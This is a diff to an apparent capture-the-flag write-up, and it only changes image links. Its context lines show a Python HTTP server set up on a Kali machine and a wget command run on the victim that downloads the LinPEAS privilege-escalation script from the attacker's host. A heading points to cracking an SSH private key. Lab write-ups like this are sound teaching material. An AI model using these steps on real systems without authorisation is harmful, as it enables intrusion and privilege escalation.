@@ -93,7 +93,7 @@ To streamline the enumeration process, I decided to use **LinPEAS**, an automate
 1. I started a Python HTTP server on my Kali machine to host the script:
 `python3 -m http.server 80`
 
-![image.png](attachment:d9cf94c1-5c5a-478e-9b5d-96a557c8d30a:image.png)
+![image.png](img/python_server.png)
 
 1. From the victim's machine, I downloaded the script to the `/tmp` directory:
 `wget http://<KALI_IP>/linpeas.sh`
@@ -102,7 +102,7 @@ To streamline the enumeration process, I decided to use **LinPEAS**, an automate
 
 After trying looking for many CVE reported on my output LinPEAS file, I tried many coincidences as “password”, “SUID”, “CVE”… etc. Also tried to exploit few of them until I spotted these results searching for “keys” on my output file:
 
-![image.png](attachment:3492a5cd-6d46-4de8-9e17-499499b87531:image.png)
+![image.png](linpeas_data.png)
 
 ### **3.2 Cracking the SSH Private Key**
 
